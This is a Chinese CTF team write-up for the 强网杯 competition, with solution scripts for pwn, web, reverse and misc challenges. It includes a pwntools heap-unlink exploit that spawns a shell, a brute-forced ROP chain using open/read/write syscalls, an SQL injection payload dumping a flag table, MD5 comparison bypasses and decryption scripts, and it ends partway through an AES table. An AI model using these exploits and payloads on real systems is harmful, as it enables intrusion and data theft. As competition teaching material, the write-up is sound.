# 强网杯writeup

team: `******`

## Gamebox
随机cookie是假的，然后printf送了一个泄漏。漏洞在于一个读取时的off-by-one，之后unlink。

脚本如下
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import os
import ctypes
code = ELF('./gamebox')
context.arch = code.arch
context.log_level = 'debug'

if len(sys.argv) > 2:
    r = remote(sys.argv[1], int(sys.argv[2]))
    libc = code.libc
elif len(sys.argv) > 1:
    r = remote('127.0.0.1', 4444)
    libc = ELF('/dbg64/libc-amd64.so')
else:
    #r = remote('127.0.0.1', 4444)
    r = process('./gamebox')
    libc = code.libc

f = read('cookie')
count = 0

def cookie(i):
    return f[i*24:i*24+24]

def play(length, name):
    global count
    r.sendlineafter("xit\n", "P")
    r.sendlineafter("write:\n", cookie(count))
    r.sendlineafter(":\n", str(length))
    r.sendafter(":\n", name)
    count += 1

def show():
    r.sendlineafter("xit\n", "S")
    return r.recvuntil('=======================\n')

def change(idx, c, new):
    r.sendlineafter("xit\n", "C")
    r.sendlineafter("index:\n", str(idx))
    r.sendlineafter("ookie:\n", cookie(c))
    r.sendafter("):", new)

def delete(idx, c):
    r.sendlineafter("xit\n", "D")
    r.sendlineafter("index:\n", str(idx))
    r.sendlineafter("ookie:\n", cookie(c))


payload = "@%9$p@%13$p@"
play(len(payload)+1, payload)
leak = show()
leak = leak.split('@')
code.address = int(leak[1], 16) - 0x18d5
libc.address = int(leak[2], 16) - 0x20830
print hex(code.address)
print hex(libc.address)
ptr = code.address + 0x203130

play(0x110-8, 'A')
play(0x110-8, flat(0x100,0x21,0).rjust(0x108))
change(1, 1, flat(
    0,
    0x101,
    ptr - 0x18,
    ptr - 0x10,
).ljust(0x100) + p64(0x100))
play(0x28, 'A'*0x28)
delete(2, 2)
change(1,1, flat('OWFRXSJYBLDBEFSA', 0, code.got['atoi'], 0x100))
raw_input('#')
change(1,1, flat(libc.sym['system'], code.plt['rand']+6))

r.sendlineafter("xit\n", "D")
r.sendlineafter("index:\n", 'sh')
r.interactive()

```

flag为`QWB{1earn_H349_H34p_hELp_y0u}`

## xx_game
用angr处理binary里的验证逻辑，并分析出栈的大小和一些gadget的地址等等。

漏洞是明显的栈溢出，但是没有输出的函数，于是在alarm附近找到一个getppid+5，是syscall ret。

然后程序还有seccomp的限制，只能通过0x602100来做输出。那么就open read write就可以了，问题在于需要爆破，大概1/4096的概率。

此题由于时间问题，比赛结束才爆破出来，flag为`qwb{1t's_4_34sy_g4m3_r1gh7?}`

脚本如下。

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
import angr
import claripy
import sys
import logging
logging.getLogger('angr').setLevel('ERROR')
angr.l.setLevel("INFO")
from pwn import *
def main(filename):
    print filename
    filename += '.bin'
    logging.getLogger('pwnlib').setLevel('ERROR')
    logging.getLogger('angr.project').setLevel('ERROR')
    r = remote('117.50.14.29', 2333)
    r.recvuntil('------------------data info------------------\n')
    code = r.recvuntil('\nHi', drop=True)
    write(filename, code.decode('base64'))

    code = ELF(filename)
    context.arch = code.arch
    load_options = {}
    load_options['auto_load_libs'] = True
    load_options['except_missing_libs'] = True
    project = angr.Project(
        filename,
        load_options=load_options
    )
    state = project.factory.call_state(0x400bc5)
    num = claripy.BVS("num", 8*8)
    state.regs.rdi = num
    simgr = project.factory.simgr(state)
    simgr.explore(find=0x400926)
    s = simgr.found[0]
    token = s.solver.any_int(num)
    #print token
    stacksize = project.factory.block(0x400bc5).capstone.insns[2].insn.operands[1].imm

    r.sendlineafter("game:", str(token)) 
    gadget = lambda x: next(code.search(asm(x, os='linux', arch='amd64')))

    pop_rdi = gadget('pop rdi; ret')
    pop_rsi_pop = gadget('pop rsi; pop r15; ret')
    leave = gadget('leave; ret')

    pop6 = code.search('5B5D415C415D'.decode('hex')).next()
    call = code.search('4C89EA4C89F64489FF41FF14DC4883C3'.decode('hex')).next()
    buf = 0x602100
    openfile = 0x602800
    num = 0x602f00
    r.sendline(flat(
        'A'*(stacksize-0x10),
        0xdeadbeef,
        pop_rdi, code.got['alarm'],
        code.plt['gets'], # write alarm@got

        pop_rdi, openfile,
        code.plt['gets'], # write filename
        pop_rdi, num,
        code.plt['gets'], # prepare atoi
        pop_rdi, num,
        code.plt['atoi'], # set rax = 2 -> open syscall
        pop6, 0, 1, code.got['alarm'], 0, 0, openfile,
            # rbx, rbp , r12, r13, r14, r15
            # xxx, xxx , ptr, rdx, rsi, edi
        call,
        0,
        0x41, buf, 0x43, 0x44, 0x45, 0x46, # rbp = buf

        pop_rdi, num,
        code.plt['gets'], # prepare atoi
        pop_rdi, num,
        code.plt['atoi'], # set rax = 0 -> read syscall
        pop6, 0, 1, code.got['alarm'], 0x30, buf, 3,
            # rbx, rbp , r12, r13, r14, r15
            # xxx, xxx , ptr, rdx, rsi, edi
        call,
        0,
        0x41, buf, 0x43, 0x44, 0x45, 0x46, # rbp = buf

        pop_rdi, num,
        code.plt['gets'], # prepare atoi
        pop_rdi, num,
        code.plt['atoi'], # set rax = 1 -> write syscall
        pop6, 0, 1, code.got['alarm'], 0x30, buf, 1,
            # rbx, rbp , r12, r13, r14, r15
            # xxx, xxx , ptr, rdx, rsi, edi
        call,
        0,
        0x41, buf, 0x43, 0x44, 0x45, 0x46, # rbp = buf
        pop_rdi, buf,
        code.plt['gets']
    ))

    r.sendline('\x35\x32')
    r.sendline('flag')
    r.sendline('2')
    r.sendline('0')
    r.sendline('1')
    try:
        leak = r.recv(0x30)
        print leak
        write('flagg', leak)
        sys.exit(0)
    except:
        print 'QQ'
    return 0

from multiprocessing import Pool
p = Pool()
res = p.map(main, [str(i+1) for i in xrange(4096)])
p.close()
p.join()

```


## Python is best language 1

到处都是sqli点，选了个比较好回显的，新发表微博处注入，提交以下文字即可（考虑到所有人都能看到，加了aes加密）：
```
d','1','2018-03-24'),(NULL,(select hex(aes_encrypt((select flllllag from flaaaaag),'gtexgrex'))),(select id from user where username='<MY_USER_NAME HERE>'),'2018-03-24'),(NULL,'x
```


## web 签到

过三个 md5 校验，第一个是弱比较 `==`，然后用 `md5('240610708') == md5('QNKCDZO')` 即可绕过；第二个是个 `===`，然后通过数组的方式绕过：`param1[]` 和 `param2[]`；最后是 md5 碰撞，然后搜索找到相应[链接](https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa)，找到了如下 hex：

```
4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2
4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2
```

使用 url 编码后放入请求体内发送即可拿到 flag：QWB{s1gns1gns1gnaftermd5}


## ai-nimals

这题考点是 socket，由于 socket 的非阻塞导致读取的字节数不够但服务端仍然是减 1024，所以导致我们需要在发送端暂停一定时间，然后我们可以把原图发送过去即可过本题(吐槽一下，还以为这种是 tenserflow 题，完美思考错了方向

```python
from pwn import *
import base64
import sys
import time

if (sys.argv[2]=='remote'):
  s = remote('117.50.13.213', 12345)
else:
  s = remote('127.0.0.1', 12345)
payload = base64.b64encode(open(sys.argv[1], 'rb').read())

pad = 1024

def main():
    s.recvuntil('plz input your base64 encode pic:')
    size = len(payload)
    length = size
    while size > 0:
        sSize = pad  if size > pad else size
        sPayload = payload[length - size:length - size + sSize:]
        size -= sSize
        s.send(sPayload)
        time.sleep(0.05)
    print s.recvline()
    print s.recv()
main()
s.interacive()
```

## welcome

一个简单的图片Misc，用StegSolve把一张看似全是噪音的图片移位，移动到300+的时候会看到明显的英文，QWB{W3c0me}




## BabyRe
是一个windows程序，有反调，先进行patch，然后动态调试，理解程序的行为。可以看到程序会读取nothing文件中的内容做一些操作。使用ida 静态分析，找到核心操作140002d77-140002de3，类似于TEA 加密，可以直接写出逆操作，脚本如下：
```
key=[0xface,0xdead,0xbabe,0xd00d]
import libnum
def encrypt(m1,m2):
    sum=0
    sum1=0
    cnt=32
    while(cnt):
        m1+=(sum+key[sum1&3])^(m2+(16*m2^(m2>>5)))
        m1=m1&0xffffffff
        sum-=0x61c88647
        sum=sum&0xffffffff
        sum1=sum
        m2+=(sum+key[(sum>>11)&3])^(m1+(16*m1^(m1>>5)))
        m2=m2&0xffffffff
        cnt-=1
    print sum
    return m1,m2   
def decrypt(m1,m2):
    sum=3337565984
    sum1=3337565984
    cnt=32
    while(cnt):
        m2-=(sum+key[(sum>>11)&3])^(m1+(16*m1^(m1>>5)))
        m2=m2&0xffffffff
        sum+=0x61c88647
        sum=sum&0xffffffff
        sum1=sum
        m1-=(sum+key[sum1&3])^(m2+(16*m2^(m2>>5)))
        m1=m1&0xffffffff
        cnt-=1
    return m1,m2   
d="C+ij1vcZGUwSQgBUPUG7FuVqh+zQ6/piPc5hHg7JEe1odD99".decode("base64")
c=d[:32]
flag=""
z=[]
for i in range(4):
    z.append(c[8*i:8*i+8])
for x in z:
    c1=int(x[:4][::-1].encode("hex"),16)
    c2=int(x[4:][::-1].encode("hex"),16)
    p1,p2=decrypt(c1,c2)
    p1=libnum.n2s(p1)
    p2=libnum.n2s(p2)
    flag=flag+p1[::-1]+p2[::-1]
flag=flag+d[32:]    
print flag



```

flag:qwbctf{this_is_not_that_hard_right?}

## picturelock
一个apk，读取一张选取的图片之后进行某种加密。每一次读取的字节的前16字节做类似于AES加密，之后的字节做异或操作。通过动态调试可以写出解密对应的逆操作。
python 
代码如下
```
import subprocess
z=[100, 56, 49, 52, 102, 49, 55, 52, 102, 97, 101, 48, 57, 48, 101, 49, 49, 97, 57, 102, 99, 99, 52, 101, 54, 53, 48, 57, 52, 99, 56, 102]
z=z[::-1]
f1=open("flag.jpg.lock","rb")
f2=open("m.jpg","wb")

num=0;
while(True):
    data=f1.read(z[num%32])
    if(len(data)==0):
        f2.close()  
        f1.close()
        exit()
    cipher=data[:16]
    f=open("tmp","wb")
    f.write(cipher)
    f.close()
    if(z[num%32]&1):
        s=subprocess.check_output("./a 1",shell=True)
    else:
        s=subprocess.check_output("./a 0",shell=True)
    ss=""
    s=s.split(" ")[:16]
    
    for x in s:
        ss+=chr(int(x,16))
    f2.write(ss)
    cnt=16
    
    res=data[16:]
    for x in res:
        #print z[cnt%32]
        f2.write(chr(ord(x)^z[cnt%32]))
        cnt+=1
    num+=1
```

c代码如下
```


#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
# define ror32_be(a, s) rol32(a, s)
# define rol32_be(a, s) ror32(a, s)
typedef struct {
	uint8_t nbr; /* number of rounds: 10 (128), 12 (192), 14 (256) */
	uint8_t strength; /* 128 = 0, 192 = 1, 256 = 2 */
	uint8_t _padding[6];
	uint8_t * data;
} aes_key;

static inline uint32_t ror32(uint32_t word, uint32_t shift)
{
	return (word >> shift) | (word << (32 - shift));
}


static inline uint32_t rol32(uint32_t word, uint32_t shift)
{
	return (word << shift) | (word >> (32 - shift));
}
static uint8_t sbox[256] = {
	0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe,
	0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4,
	0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7,
	0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3,
	0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, 0x09,
	0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3,
	0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe,
	0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85,
	0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92,
	0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c,
	0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19,
	0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14,
	0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2,
	0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5,
	0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25,
	0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
	0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86,
	0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e,
	0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42,
	0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
};

static uint8_t rsbox[256] = {
	0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81,
	0xf3, 0xd7, 0xfb, 0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e,
	0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb, 0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23,
	0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e, 0x08, 0x2e, 0xa1, 0x66,
	0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25, 0x72,
	0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65,
	0xb6, 0x92, 0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46,
	0x57, 0xa7, 0x8d, 0x9d, 0x84, 0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a,
	0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06, 0xd0, 0x2c, 0x1e, 0x8f, 0xca,
	0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b, 0x3a, 0x91,
	0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6,
	0x73, 0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8,
	0x1c, 0x75, 0xdf, 0x6e, 0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f,
	0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b, 0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2,
	0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4, 0x1f, 0xdd, 0xa8,
	0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f,
	0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93,
	0xc9, 0x9c, 0xef, 0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb,
	0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6,
	0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d
};

static uint8_t Rcon[] = {
	0x8d, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36, 0x6c, 0xd8,
	0xab, 0x4d, 0x9a, 0x2f, 0x5e, 0xbc, 0x63, 0xc6, 0x97, 0x35, 0x6a, 0xd4, 0xb3,
	0x7d, 0xfa, 0xef, 0xc5, 0x91, 0x39, 0x72, 0xe4, 0xd3, 0xbd, 0x61, 0xc2, 0x9f,
	0x25, 0x4a, 0x94, 0x33, 0x66, 0xcc, 0x83, 0x1d, 0x3a, 0x74, 0xe8, 0xcb,
};

#define G(a,b,c,d,e,f) { a,b,c,d,e,f }
static uint8_t gmtab[256][6] =
{
	G(0x00, 0x00, 0x00, 0x00, 0x00, 0x00), G(0x02, 0x03, 0x09, 0x0b, 0x0d, 0x0e),
	G(0x04, 0x06, 0x12, 0x16, 0x1a, 0x1c), G(0x06, 0x05, 0x1b, 0x1d, 0x17, 0x12),
	G(0x08, 0x0c, 0x24, 0x2c, 0x34, 0x38), G(0x0a, 0x0f, 0x2d, 0x27, 0x39, 0x36),
	G(0x0c, 0x0a, 0x36, 0x3a, 0x2e, 0x24), G(0x0e, 0x09, 0x3f, 0x31, 0x23, 0x2a),
	G(0x10, 0x18, 0x48, 0x58, 0x68, 0x70), G(0x12, 0x1b, 0x41, 0x53, 0x65, 0x7e),
	G(0x14, 0x1e, 0x5a, 0x4e, 0x72, 0x6c), G(0x16, 0x1d, 0x53, 0x45, 0x7f, 0x62),
	G(0x18, 0x14, 0x6c, 0x74, 0x5c, 0x48), G(0x1a, 0x17, 0x65, 0x7f, 0x51, 0x46),
	G(0x1c, 0x12, 0x7e, 0x62, 0x46, 0x54), G(0x1e, 0x11, 0x77, 0x69, 0x4b, 0x5a),
	G(0x20, 0x30, 0x90, 0xb0, 0xd0, 0xe0), G(0x22, 0x33, 0x99, 0xbb, 0xdd, 0xee),
	G(0x24, 0x36, 0x82, 0xa6, 0xca, 0xfc), G(0x26, 0x35, 0x8b, 0xad, 0xc7, 0xf2),
	G(0x28, 0x3c, 0xb4, 0x9c, 0xe4, 0xd8), G(0x2a, 0x3f, 0xbd, 0x97, 0xe9, 0xd6),
	G(0x2c, 0x3a, 0xa6, 0x8a, 0xfe, 0xc4), G(0x2e, 0x39, 0xaf, 0x81, 0xf3, 0xca),
	G(0x30, 0x28, 0xd8, 0xe8, 0xb8, 0x90), G(0x32, 0x2b, 0xd1, 0xe3, 0xb5, 0x9e),
	G(0x34, 0x2e, 0xca, 0xfe, 0xa2, 0x8c), G(0x36, 0x2d, 0xc3, 0xf5, 0xaf, 0x82),
	G(0x38, 0x24, 0xfc, 0xc4, 0x8c, 0xa8), G(0x3a, 0x27, 0xf5, 0xcf, 0x81, 0xa6),
	G(0x3c, 0x22, 0xee, 0xd2, 0x96, 0xb4), G(0x3e, 0x21, 0xe7, 0xd9, 0x9b, 0xba),
	G(0x40, 0x60, 0x3b, 0x7b, 0xbb, 0xdb), G(0x42, 0x63, 0x32, 0x70, 0xb6, 0xd5),
	G(0x44, 0x66, 0x29, 0x6d, 0xa1, 0xc7), G(0x46, 0x65, 0x20, 0x66, 0xac, 0xc9),
	G(0x48, 0x6c, 0x1f, 0x57, 0x8f, 0xe3), G(0x4a, 0x6f, 0x16, 0x5c, 0x82, 0xed),
	G(0x4c, 0x6a, 0x0d, 0x41, 0x95, 0xff), G(0x4e, 0x69, 0x04, 0x4a, 0x98, 0xf1),
	G(0x50, 0x78, 0x73, 0x23, 0xd3, 0xab), G(0x52, 0x7b, 0x7a, 0x28, 0xde, 0xa5),
	G(0x54, 0x7e, 0x61, 0x35, 0xc9, 0xb7), G(0x56, 0x7d, 0x68, 0x3e, 0xc4, 0xb9),
	G(0x58, 0x74, 0x57, 0x0f, 0xe7, 0x93), G(0x5a, 0x77, 0x5e, 0x04, 0xea, 0x9d),
	G(0x5c, 0x72, 0x45, 0x19, 0xfd, 0x8f), G(0x5e, 0x71, 0x4c, 0x12, 0xf0, 0x81),
	G(0x60, 0x50, 0xab, 0xcb, 0x6b, 0x3b), G(0x62, 0x53, 0xa2, 0xc0, 0x66, 0x35),
	G(0x64, 0x56, 0xb9, 0xdd, 0x71, 0x27), G(0x66, 0x55, 0xb0, 0xd6, 0x7c, 0x29),
	G(0x68, 0x5c, 0x8f, 0xe7, 0x5f, 0x03), G(0x6a, 0x5f, 0x86, 0xec, 0x52, 0x0d),
	G(0x6c, 0x5a, 0x9d, 0xf1, 0x45, 0x1f), G(0x6e, 0x59, 0x94, 0xfa, 0x48, 0x11),
	G(0x70, 0x48, 0xe3, 0x93, 0x03, 0x4b), G(0x72, 0x4b, 0xea, 0x98, 0x0e, 0x45),
	G(0x74, 0x4e, 0xf1, 0x85, 0x19, 0x57), G(0x76, 0x4d, 0xf8, 0x8e, 0x14, 0x59),
	G(0x78, 0x44, 0xc7, 0xbf, 0x37, 0x73), G(0x7a, 0x47, 0xce, 0xb4, 0x3a, 0x7d),
	G(0x7c, 0x42, 0xd5, 0xa9, 0x2d, 0x6f), G(0x7e, 0x41, 0xdc, 0xa2, 0x20, 0x61),
	G(0x80, 0xc0, 0x76, 0xf6, 0x6d, 0xad), G(0x82, 0xc3, 0x7f, 0xfd, 0x60, 0xa3),
	G(0x84, 0xc6, 0x64, 0xe0, 0x77, 0xb1), G(0x86, 0xc5, 0x6d, 0xeb, 0x7a, 0xbf),
	G(0x88, 0xcc, 0x52, 0xda, 0x59, 0x95), G(0x8a, 0xcf, 0x5b, 0xd1, 0x54, 0x9b),
	G(0x8c, 0xca, 0x40, 0xcc, 0x43, 0x89), G(0x8e, 0xc9, 0x49, 0xc7, 0x4e, 0x87),
	G(0x90, 0xd8, 0x3e, 0xae, 0x05, 0xdd), G(0x92, 0xdb, 0x37, 0xa5, 0x08, 0xd3),
	G(0x94, 0xde, 0x2c, 0xb8, 0x1f, 0xc1), G(0x96, 0xdd, 0x25, 0xb3, 0x12, 0xcf),
	G(0x98, 0xd4, 0x1a, 0x82, 0x31, 0xe5), G(0x9a, 0xd7, 0x13, 0x89, 0x3c, 0xeb),
	G(0x9c, 0xd2, 0x08, 0x94, 0x2b, 0xf9), G(0x9e, 0xd1, 0x01, 0x9f, 0x26, 0xf7),
	G(0xa0, 0xf0, 0xe6, 0x46, 0xbd, 0x4d), G(0xa2, 0xf3, 0xef, 0x4d, 0xb0, 0x43),
	G(0xa4, 0xf6, 0xf4, 0x50, 0xa7, 0x51), G(0xa6, 0xf5, 0xfd, 0x5b, 0xaa, 0x5f),
	G(0xa8, 0xfc, 0xc2, 0x6a, 0x89, 0x75), G(0xaa, 0xff, 0xcb, 0x61, 0x84, 0x7b),
	G(0xac, 0xfa, 0xd0, 0x7c, 0x93, 0x69), G(0xae, 0xf9, 0xd9, 0x77, 0x9e, 0x67),
	G(0xb0, 0xe8, 0xae, 0x1e, 0xd5, 0x3d), G(0xb2, 0xeb, 0xa7, 0x15, 0xd8, 0x33),
	G(0xb4, 0xee, 0xbc, 0x08, 0xcf, 0x21), G(0xb6, 0xed, 0xb5, 0x03, 0xc2, 0x2f),
	G(0xb8, 0xe4, 0x8a, 0x32, 0xe1, 0x05), G(0xba, 0xe7, 0x83, 0x39, 0xec, 0x0b),
	G(0xbc, 0xe2, 0x98, 0x24, 0xfb, 0x19), G(0xbe, 0xe1, 0x91, 0x2f, 0xf6, 0x17),
	G(0xc0, 0xa0, 0x4d, 0x8d, 0xd6, 0x76), G(0xc2, 0xa3, 0x44, 0x86, 0xdb, 0x78),
	G(0xc4, 0xa6, 0x5f, 0x9b, 0xcc, 0x6a), G(0xc6, 0xa5, 0x56, 0x90, 0xc1, 0x64),
	G(0xc8, 0xac, 0x69, 0xa1, 0xe2, 0x4e), G(0xca, 0xaf, 0x60, 0xaa, 0xef, 0x40),
	G(0xcc, 0xaa, 0x7b, 0xb7, 0xf8, 0x52), G(0xce, 0xa9, 0x72, 0xbc, 0xf5, 0x5c),
	G(0xd0, 0xb8, 0x05, 0xd5, 0xbe, 0x06), G(0xd2, 0xbb, 0x0c, 0xde, 0xb3, 0x08),
	G(0xd4, 0xbe, 0x17, 0xc3, 0xa4, 0x1a), G(0xd6, 0xbd, 0x1e, 0xc8, 0xa9, 0x14),
	G(0xd8, 0xb4, 0x21, 0xf9, 0x8a, 0x3e), G(0xda, 0xb7, 0x28, 0xf2, 0x87, 0x30),
	G(0xdc, 0xb2, 0x33, 0xef, 0x90, 0x22), G(0xde, 0xb1, 0x3a, 0xe4, 0x9d, 0x2c),
	G(0xe0, 0x90, 0xdd, 0x3d, 0x06, 0x96), G(0xe2, 0x93, 0xd4, 0x36, 0x0b, 0x98),
	G(0xe4, 0x96, 0xcf, 0x2b, 0x1c, 0x8a), G(0xe6, 0x95, 0xc6, 0x20, 0x11, 0x84),
	G(0xe8, 0x9c, 0xf9, 0x11, 0x32, 0xae), G(0xea, 0x9f, 0xf0, 0x1a, 0x3f, 0xa0),
	G(0xec, 0x9a, 0xeb, 0x07, 0x28, 0xb2), G(0xee, 0x99, 0xe2, 0x0c, 0x25, 0xbc),
	G(0xf0, 0x88, 0x95, 0x65, 0x6e, 0xe6), G(0xf2, 0x8b, 0x9c, 0x6e, 0x63, 0xe8),
	G(0xf4, 0x8e, 0x87, 0x73, 0x74, 0xfa), G(0xf6, 0x8d, 0x8e, 0x78, 0x79, 0xf4),
	G(0xf8, 0x84, 0xb1, 0x49, 0x5a, 0xde), G(0xfa, 0x87, 0xb8, 0x42, 0x57, 0xd0),
	G(0xfc, 0x82, 0xa3, 0x5f, 0x40, 0xc2), G(0xfe, 0x81, 0xaa, 0x54, 0x4d, 0xcc),
	G(0x1b, 0x9b, 0xec, 0xf7, 0xda, 0x41), G(0x19, 0x98, 0xe5, 0xfc, 0xd7, 0x4f),
	G(0x1f, 0x9d, 0xfe, 0xe1, 0xc0, 0x5d), G(0x1d, 0x9e, 0xf7, 0xea, 0xcd, 0x53),
	G(0x13, 0x97, 0xc8, 0xdb, 0xee, 0x79), G(0x11, 0x94, 0xc1, 0xd0, 0xe3, 0x77),
	G(0x17, 0x91, 0xda, 0xcd, 0xf4, 0x65), G(0x15, 0x92, 0xd3, 0xc6, 0xf9, 0x6b),
	G(0x0b, 0x83, 0xa4, 0xaf, 0xb2, 0x31), G(0x09, 0x80, 0xad, 0xa4, 0xbf, 0x3f),
	G(0x0f, 0x85, 0xb6, 0xb9, 0xa8, 0x2d), G(0x0d, 0x86, 0xbf, 0xb2, 0xa5, 0x23),
	G(0x03, 0x8f, 0x80, 0x83, 0x86, 0x09), G(0x01, 0x8c, 0x89, 0x88, 0x8b, 0x07),
	G(0x07, 0x89, 0x92, 0x95, 0x9c, 0x15), G(0x05, 0x8a, 0x9b, 0x9e, 0x91, 0x1b),
	G(0x3b, 0xab, 0x7c, 0x47, 0x0a, 0xa1), G(0x39, 0xa8, 0x75, 0x4c, 0x07, 0xaf),
	G(0x3f, 0xad, 0x6e, 0x51, 0x10, 0xbd), G(0x3d, 0xae, 0x67, 0x5a, 0x1d, 0xb3),
	G(0x33, 0xa7, 0x58, 0x6b, 0x3e, 0x99), G(0x31, 0xa4, 0x51, 0x60, 0x33, 0x97),
	G(0x37, 0xa1, 0x4a, 0x7d, 0x24, 0x85), G(0x35, 0xa2, 0x43, 0x76, 0x29, 0x8b),
	G(0x2b, 0xb3, 0x34, 0x1f, 0x62, 0xd1), G(0x29, 0xb0, 0x3d, 0x14, 0x6f, 0xdf),
	G(0x2f, 0xb5, 0x26, 0x09, 0x78, 0xcd), G(0x2d, 0xb6, 0x2f, 0x02, 0x75, 0xc3),
	G(0x23, 0xbf, 0x10, 0x33, 0x56, 0xe9), G(0x21, 0xbc, 0x19, 0x38, 0x5b, 0xe7),
	G(0x27, 0xb9, 0x02, 0x25, 0x4c, 0xf5), G(0x25, 0xba, 0x0b, 0x2e, 0x41, 0xfb),
	G(0x5b, 0xfb, 0xd7, 0x8c, 0x61, 0x9a), G(0x59, 0xf8, 0xde, 0x87, 0x6c, 0x94),
	G(0x5f, 0xfd, 0xc5, 0x9a, 0x7b, 0x86), G(0x5d, 0xfe, 0xcc, 0x91, 0x76, 0x88),
	G(0x53, 0xf7, 0xf3, 0xa0, 0x55, 0xa2), G(0x51, 0xf4, 0xfa, 0xab, 0x58, 0xac),
	G(0x57, 0xf1, 0xe1, 0xb6, 0x4f, 0xbe), G(0x55, 0xf2, 0xe8, 0xbd, 0x42, 0xb0),
	G(0x4b, 0xe3, 0x9f, 0xd4, 0x09, 0xea), G(0x49, 0xe0, 0x96, 0xdf, 0x04, 0xe4),
	G(0x4f, 0xe5, 0x8d, 0xc2, 0x13, 0xf6), G(0x4d, 0xe6, 0x84, 0xc9, 0x1e, 0xf8),
	G(0x43, 0xef, 0xbb, 0xf8, 0x3d, 0xd2), G(0x41, 0xec, 0xb2, 0xf3, 0x30, 0xdc),
